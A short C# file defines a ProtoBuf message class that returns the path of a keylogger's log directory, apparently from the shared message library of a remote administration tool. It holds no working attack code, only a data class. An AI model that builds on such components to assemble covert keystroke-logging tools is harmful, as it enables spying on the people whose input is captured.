using ProtoBuf;

namespace Rouzzf.Common.Messages
{
    [ProtoContract]
    public class GetKeyloggerLogsDirectoryResponse : IMessage
    {
        [ProtoMember(1)]
        public string LogsDirectory { get; set; }
    }
}
